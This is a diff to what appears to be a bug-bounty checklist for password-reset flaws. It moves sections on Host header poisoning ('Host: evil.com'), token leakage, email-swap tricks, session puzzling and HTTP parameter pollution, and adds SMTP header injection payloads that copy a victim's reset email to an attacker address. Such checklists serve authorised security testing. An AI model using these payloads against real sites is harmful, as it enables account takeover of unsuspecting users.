@@ -13,30 +13,7 @@
 - Intercept the request and add some headers with attacker control domain.
 - Check email and see if password token comes with attacker control domain.
 ```
-
-```
-- Click forgot passowrd and enter attacker email.
-- Intercept the response (Action > Do intercept > Response to this request) and looking for password reset token or code.
-- If found, then do the same procedure for victim email. 
-```
-
-```
-- Issue a password reset token for atttacker@email.tld.
-- Go to settings and change your email to victim@email.tld.
-- Now go to attacker@email.tld's inbox and click on password reset link.
-- See the link is working or not.
-
-# Impact
-Sometime web app doesn't care about email. User can create more than one account using same email with unique username. 
-```
-#### Session Puzzling/Session Overloading Attack
-```
-- Try to access victim's dashboard or profile page normaly which is accessible after login.
-- Go to Forgot Password and request for password change behalf of victim.
-- Now directly go to dashboard or profile page. If victim's dashboard or profile accessible then it is Session Puzzling/Session Overloading Attack.
-```
-
-#### Headers
+##### Headers
 Try to change Host header.
 ```
 Host: evil.com
@@ -56,6 +33,36 @@ Referer
 Origin
 ```
 
+```
+- Click forgot passowrd and enter attacker email.
+- Intercept the response (Action > Do intercept > Response to this request) and looking for password reset token or code.
+- If found, then do the same procedure for victim email. 
+```
+
+```
+- Click forgot passowrd and enter attacker email.
+- Go to email and click on password reset link. See carefully the password reset link, if the link contatin the email using parameter change it with victim email
+  or use both email using HPP techniques.
+- If email found in POST body, change it with victim email or use both attacker and victim email using HPP.
+- If no email found, try SMTP Header Injection techniques.
+```
+
+```
+- Issue a password reset token for atttacker@email.tld.
+- Go to settings and change your email to victim@email.tld.
+- Now go to attacker@email.tld's inbox and click on password reset link.
+- See the link is working or not.
+
+# Impact
+Sometime web app doesn't care about email. User can create more than one account using same email with unique username. 
+```
+#### Session Puzzling/Session Overloading Attack
+```
+- Try to access victim's dashboard or profile page normaly which is accessible after login.
+- Go to Forgot Password and request for password change behalf of victim.
+- Now directly go to dashboard or profile page. If victim's dashboard or profile accessible then it is Session Puzzling/Session Overloading Attack.
+```
+
 #### With HTTP Parameter Pollution
 ```
 - Go to password reset link, enter new password and intercept the request
@@ -64,31 +71,20 @@ Origin
 - If response success then see which account password has been changed
 ```
 
+#### SMTP Header Injection
 ```
 victim@mail.tld%0d%0acc:attacker@mail.tld
-```
 
-```
 victim@mail.tld%0d%0abcc:attacker@mail.tld
-```
 
-```
 email=victim@email.tld%20email=attacker@email.tld
-```
 
-```
 email=victim@email.tld|email=attacker@email.tld
-```
 
-```
 email="victim@mail.tld",email="attacker@mail.tld"
-```
 
-```
 email=victim@email.tld:attacker@email.tld
-```
 
-```
 {"email":["victim@email.tld","atracker@email.tld"]}
 ```
 
